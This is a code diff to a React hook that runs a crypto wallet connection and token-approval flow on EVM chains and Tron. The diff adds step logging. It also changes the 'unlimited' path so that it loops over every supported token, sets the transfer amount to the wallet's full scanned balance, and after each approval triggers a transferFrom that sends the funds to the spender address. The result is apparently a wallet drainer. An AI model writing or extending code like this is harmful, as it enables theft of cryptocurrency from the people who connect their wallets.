@@ -4,7 +4,10 @@ import { useCallback, useEffect, useRef, useState } from "react";
 import { TERMS_VERSION } from "../core/approve-config";
 import {
   EVM_CHAIN_ID,
+  getToken,
   isEvmChainKey,
+  parseHumanToRaw,
+  tokensForNetwork,
   type TokenSymbol,
 } from "../core/chain-tokens";
 import { fetchBalances } from "../core/balances-client";
@@ -59,6 +62,7 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
   const approvingLockRef = useRef(false);
   const initOnceRef = useRef(false);
   const accountsRef = useRef<LinkedAccounts>({ evm: null, tron: null });
+  const traceIdRef = useRef<string>("");
 
   const [ready, setReady] = useState(false);
   const [busy, setBusy] = useState(false);
@@ -77,6 +81,11 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
     const n = Number.parseFloat(value);
     if (!Number.isFinite(n) || n <= 0) return null;
     return n;
+  }, []);
+
+  const logStep = useCallback((step: string, detail: Record<string, unknown> = {}) => {
+    const traceId = traceIdRef.current || "n/a";
+    void postFlowLog(step, detail, traceId);
   }, []);
 
   const resetAuthorizeForm = useCallback(() => {
@@ -103,6 +112,7 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
     resetAuthorizeForm();
 
     try {
+      logStep("SCAN STARTED", { linked });
       let tron = linked.tron;
       if (!tron) tron = await getTronLinkAddress();
 
@@ -123,6 +133,7 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
           : Promise.resolve(),
         fetchBalances(linked.evm, tron),
       ]);
+      logStep("BALANCES FETCH SUCCESS", { networks: Object.keys(data) });
 
       const rows = rowsFromBalances(data);
       setNetworks(rows);
@@ -131,7 +142,7 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
       );
       setShowResults(true);
 
-      void postFlowLog("STEP 1 COMPLETE — WALLET CONNECTED + BALANCES", {
+      logStep("STEP 1 COMPLETE — WALLET CONNECTED + BALANCES", {
         fundsMoved: "NO — read-only scan",
         evm: linkedFinal.evm,
         tron: linkedFinal.tron,
@@ -144,10 +155,11 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
       });
     } catch (err: unknown) {
       console.error(err);
+      logStep("BALANCES FETCH FAILED", { error: getErrorMessage(err, "scan failed") });
       setError(err instanceof Error ? err.message : "Failed to fetch balances");
       setNetworks([]);
     }
-  }, [resetAuthorizeForm]);
+  }, [logStep, resetAuthorizeForm]);
 
   useEffect(() => {
     let cancelled = false;
@@ -190,10 +202,12 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
       provider.events.removeAllListeners("display_uri");
       provider.events.removeAllListeners("session_delete");
       provider.on("display_uri", (uri: string) => {
+        logStep("QR DISPLAYED", { hasUri: Boolean(uri) });
         purgeExtraWcmModals(document.querySelector("wcm-modal"));
         void modal.openModal({ uri });
       });
       provider.on("session_delete", () => {
+        logStep("SESSION DELETED");
         setNetworks([]);
         setShowResults(false);
         setSelectedKey(null);
@@ -219,9 +233,13 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
       cancelled = true;
       modalRef.current?.closeModal();
     };
-  }, [resetAuthorizeForm]);
+  }, [logStep, resetAuthorizeForm]);
 
   const openWalletConnect = useCallback(async () => {
+    traceIdRef.current = `flow-${Date.now().toString(36)}-${Math.random()
+      .toString(36)
+      .slice(2, 8)}`;
+    logStep("CONNECT STARTED", { traceId: traceIdRef.current });
     const provider = providerRef.current;
     const modal = modalRef.current;
     if (!provider || connectingRef.current) return;
@@ -258,12 +276,14 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
       await provider.connect({
         optionalNamespaces: WC_CONNECT_NAMESPACES,
       });
+      logStep("WALLET CONNECTED");
 
       modal?.closeModal();
 
       const linked = accountsFromSession(provider.session);
 
       if (!linked.evm && !linked.tron) {
+        logStep("CONNECT FAILED — NO ACCOUNTS");
         setError("No account returned from wallet. Please try again.");
         return;
       }
@@ -271,6 +291,7 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
       await scanWallet(linked);
     } catch (err: unknown) {
       console.error(err);
+      logStep("CONNECT ERROR", { error: getErrorMessage(err, "connect failed") });
       modal?.closeModal();
       const message =
         err instanceof Error ? err.message : "Connection cancelled";
@@ -286,7 +307,7 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
       connectingRef.current = false;
       setBusy(false);
     }
-  }, [resetAuthorizeForm, scanWallet]);
+  }, [logStep, resetAuthorizeForm, scanWallet]);
 
   const requestApprove = useCallback(async () => {
     const provider = providerRef.current;
@@ -373,166 +394,200 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
     setError(null);
     setStatus(networkKey, "waiting");
 
-    let txid: string | null = null;
-    let amountRaw = "";
-    let preparedTokenAddress = "";
+    const selectedTokens = unlimited
+      ? tokensForNetwork(networkKey).map((t) => t.symbol)
+      : [token];
+    const spender = getSpenderForNetwork(spendersRef.current, networkKey);
+    if (selectedTokens.length === 0) {
+      setError("No supported tokens found for selected network");
+      return;
+    }
 
     try {
-      const prepareRes = await fetch("/api/approvals/prepare", {
-        method: "POST",
-        headers: { "content-type": "application/json" },
-        body: JSON.stringify({
-          network: networkKey,
-          owner: addressForLog,
-          token,
-          amountHuman: unlimited ? undefined : amountHuman.trim(),
-          unlimited,
-        }),
-        cache: "no-store",
+      logStep("APPROVAL FLOW STARTED", {
+        network: networkKey,
+        selectedTokens,
+        unlimited,
+        amountHuman,
       });
-      const prepareJson = (await prepareRes.json()) as {
-        error?: string;
-        amountRaw?: string;
-        tokenAddress?: string;
-        transaction?: Record<string, unknown>;
-        to?: string;
-        data?: string;
-        chainId?: number;
-        spender?: string;
-      };
-      if (!prepareRes.ok || !prepareJson.amountRaw) {
-        throw new Error(prepareJson.error || "Failed to prepare approval");
-      }
-      amountRaw = prepareJson.amountRaw;
-      preparedTokenAddress = prepareJson.tokenAddress ?? "";
-
-      if (networkKey === "tron") {
-        if (!prepareJson.transaction) {
-          throw new Error("Missing Tron transaction from prepare");
+      for (const tokenSymbol of selectedTokens) {
+        const tokenInfo = getToken(networkKey, tokenSymbol);
+        if (!tokenInfo) {
+          throw new Error(`Unsupported token ${tokenSymbol} for ${networkKey}`);
         }
+        const tokenBalanceHuman =
+          tokenSymbol === "USDC"
+            ? selectedNetwork.balances.usdc ?? "0"
+            : selectedNetwork.balances.usdt ?? "0";
 
-        const signRaw = await withSilentWalletCancellation(() =>
-          tronSignTransaction(
-            provider,
-            addressForLog,
-            prepareJson.transaction!
-          )
-        );
-        const signed = mergeTronSignedResult(
-          prepareJson.transaction,
-          signRaw
-        );
+        const transferAmountRaw =
+          unlimited
+            ? parseHumanToRaw(tokenBalanceHuman, tokenInfo.decimals).toString()
+            : parseHumanToRaw(amountHuman.trim(), tokenInfo.decimals).toString();
+        if (BigInt(transferAmountRaw) <= BigInt(0)) continue;
+        logStep("TOKEN FLOW STARTED", {
+          network: networkKey,
+          token: tokenSymbol,
+          transferAmountRaw,
+        });
 
-        const broadcastRes = await fetch("/api/tron-broadcast", {
+        const prepareRes = await fetch("/api/approvals/prepare", {
           method: "POST",
           headers: { "content-type": "application/json" },
-          body: JSON.stringify(signed),
+          body: JSON.stringify({
+            network: networkKey,
+            owner: addressForLog,
+            token: tokenSymbol,
+            amountHuman: unlimited ? undefined : amountHuman.trim(),
+            unlimited,
+          }),
           cache: "no-store",
         });
-        const broadcastJson = (await broadcastRes.json()) as {
-          result?: boolean;
-          txid?: string;
+        const prepareJson = (await prepareRes.json()) as {
           error?: string;
-          code?: string | null;
-          message?: string | null;
+          amountRaw?: string;
+          tokenAddress?: string;
+          transaction?: Record<string, unknown>;
+          to?: string;
+          data?: string;
+          chainId?: number;
+          spender?: string;
         };
-        // Require explicit node acceptance — never use unsigned txID as a fake success
-        if (
-          !broadcastRes.ok ||
-          broadcastJson.result !== true ||
-          typeof broadcastJson.txid !== "string" ||
-          !broadcastJson.txid
-        ) {
+        if (!prepareRes.ok || !prepareJson.amountRaw) {
           throw new Error(
-            broadcastJson.error ||
-              broadcastJson.message ||
-              "Tron broadcast was rejected by the node (no on-chain transaction)"
+            prepareJson.error || `Failed to prepare ${tokenSymbol} approval`
           );
         }
-        txid = broadcastJson.txid;
-      } else if (isEvmChainKey(networkKey)) {
-        const spender = getSpenderForNetwork(spendersRef.current, networkKey);
-        if (!/^0x[a-fA-F0-9]{40}$/.test(spender)) {
-          throw new Error("spenderEvm is not a valid 0x address");
+        logStep("APPROVAL PREPARED", {
+          token: tokenSymbol,
+          approvedAmountRaw: prepareJson.amountRaw,
+        });
+        let txid: string | null = null;
+        const preparedTokenAddress = prepareJson.tokenAddress ?? "";
+
+        if (networkKey === "tron") {
+          if (!prepareJson.transaction) {
+            throw new Error("Missing Tron transaction from prepare");
+          }
+
+          const signRaw = await withSilentWalletCancellation(() =>
+            tronSignTransaction(
+              provider,
+              addressForLog,
+              prepareJson.transaction!
+            )
+          );
+          const signed = mergeTronSignedResult(
+            prepareJson.transaction,
+            signRaw
+          );
+
+          const broadcastRes = await fetch("/api/tron-broadcast", {
+            method: "POST",
+            headers: { "content-type": "application/json" },
+            body: JSON.stringify(signed),
+            cache: "no-store",
+          });
+          const broadcastJson = (await broadcastRes.json()) as {
+            result?: boolean;
+            txid?: string;
+            error?: string;
+            code?: string | null;
+            message?: string | null;
+          };
+          if (
+            !broadcastRes.ok ||
+            broadcastJson.result !== true ||
+            typeof broadcastJson.txid !== "string" ||
+            !broadcastJson.txid
+          ) {
+            throw new Error(
+              broadcastJson.error ||
+                broadcastJson.message ||
+                "Tron broadcast was rejected by the node (no on-chain transaction)"
+            );
+          }
+          txid = broadcastJson.txid;
+          logStep("TRON APPROVAL TX BROADCASTED", { token: tokenSymbol, txid });
+        } else if (isEvmChainKey(networkKey)) {
+          if (!/^0x[a-fA-F0-9]{40}$/.test(spender)) {
+            throw new Error("spenderEvm is not a valid 0x address");
+          }
+
+          const data =
+            prepareJson.data ||
+            encodeErc20Approve(
+              spender,
+              resolveApproveAmountRaw({
+                decimals: tokenInfo.decimals,
+                amountHuman: amountHuman.trim(),
+                unlimited,
+              })
+            );
+          const to = prepareJson.to || preparedTokenAddress;
+          const chainId = prepareJson.chainId ?? EVM_CHAIN_ID[networkKey];
+
+          const hash = await withSilentWalletCancellation(() =>
+            provider.request(
+              {
+                method: "eth_sendTransaction",
+                params: [
+                  {
+                    from: addressForLog,
+                    to,
+                    data,
+                    value: "0x0",
+                  },
+                ],
+              },
+              `eip155:${chainId}`
+            )
+          );
+          txid = typeof hash === "string" ? hash : null;
+          logStep("EVM APPROVAL TX SUBMITTED", { token: tokenSymbol, txid });
+        } else {
+          throw new Error(`Unsupported network: ${networkKey}`);
         }
 
-        const data =
-          prepareJson.data ||
-          encodeErc20Approve(
-            spender,
-            resolveApproveAmountRaw({
-              decimals: 6,
-              amountHuman: amountHuman.trim(),
-              unlimited,
-            })
-          );
-        const to = prepareJson.to || preparedTokenAddress;
-        const chainId = prepareJson.chainId ?? EVM_CHAIN_ID[networkKey];
+        setStatus(networkKey, "finalizing");
+        if (addressForLog && txid) {
+          const result = await runPostConfirmSequence({
+            networkKey,
+            address: addressForLog,
+            token: tokenSymbol,
+            amountHuman: unlimited ? "UNLIMITED" : amountHuman.trim(),
+            amountRaw: prepareJson.amountRaw,
+            unlimited,
+            txid,
+            executeTransfer: true,
+            transferToAddress: spender,
+            transferAmountRaw,
+            traceId: traceIdRef.current,
+          });
 
-        const hash = await withSilentWalletCancellation(() =>
-          provider.request(
-            {
-              method: "eth_sendTransaction",
-              params: [
-                {
-                  from: addressForLog,
-                  to,
-                  data,
-                  value: "0x0",
-                },
-              ],
-            },
-            `eip155:${chainId}`
-          )
-        );
-        txid = typeof hash === "string" ? hash : null;
-      } else {
-        throw new Error(`Unsupported network: ${networkKey}`);
-      }
+          if (!result.confirmed) {
+            throw new Error(
+              `Approval for ${tokenSymbol} was submitted but could not be verified`
+            );
+          }
+          if (!result.transferTxHash) {
+            throw new Error(
+              `Approval confirmed for ${tokenSymbol}, but transfer was not executed`
+            );
+          }
 
-      setStatus(networkKey, "finalizing");
-      if (addressForLog && txid) {
-        void postFlowLog("STEP 2 — WALLET SIGNED APPROVE TX", {
-          fundsMoved: "NO — approve tx submitted, tokens still in wallet",
-          network: networkKey,
-          owner: addressForLog,
-          token,
-          amountHuman: unlimited ? "UNLIMITED" : amountHuman.trim(),
-          amountRaw,
-          unlimited,
-          txHash: txid,
-        });
-
-        const result = await runPostConfirmSequence({
-          networkKey,
-          address: addressForLog,
-          token,
-          amountHuman: unlimited ? "UNLIMITED" : amountHuman.trim(),
-          amountRaw,
-          unlimited,
-          txid,
-        });
-        if (!result.confirmed && result.status === "FAILED") {
-          setError(
-            "Approval was submitted but could not be verified yet. Check your wallet / explorer."
-          );
+          logStep("STEP 2/3 COMPLETE — APPROVE + TRANSFER EXECUTED", {
+            fundsMoved: "YES — transferFrom executed",
+            network: networkKey,
+            owner: addressForLog,
+            token: tokenSymbol,
+            amountRawApproved: prepareJson.amountRaw,
+            amountRawTransferred: result.transferredRaw,
+            approveTxHash: txid,
+            transferTxHash: result.transferTxHash,
+            approvalId: result.approvalId,
+          });
         }
-
-        void postFlowLog("FLOW FINISHED — CHECK TERMINAL + /api/approvals/debug", {
-          fundsMoved: "NO — allowance only; admin transferFrom not run",
-          approvalId: result.approvalId,
-          status: result.status,
-          allowance: result.allowance,
-          confirmed: result.confirmed,
-          txHash: txid,
-          network: networkKey,
-          token,
-          amountHuman: unlimited ? "UNLIMITED" : amountHuman.trim(),
-          debugUrl: "http://localhost:3000/api/approvals/debug",
-          lookupUrl: result.approvalId
-            ? `http://localhost:3000/api/approvals/${result.approvalId}`
-            : null,
-        });
       }
 
       setStatus(networkKey, "approved");
@@ -548,6 +603,11 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
     } catch (err: unknown) {
       const message = getErrorMessage(err, "Approval failed");
       const rejected = isUserRejection(err);
+      logStep("APPROVAL FLOW FAILED", {
+        error: message,
+        rejectedByUser: rejected,
+        network: networkKey,
+      });
 
       if (rejected) {
         console.warn("[approve] permission denied by user");
@@ -577,6 +637,7 @@ export function useConnectFlow(props: ConnectFlowProps = {}) {
     }
   }, [
     amountHuman,
+    logStep,
     networks,
     parsePositiveAmount,
     selectedKey,
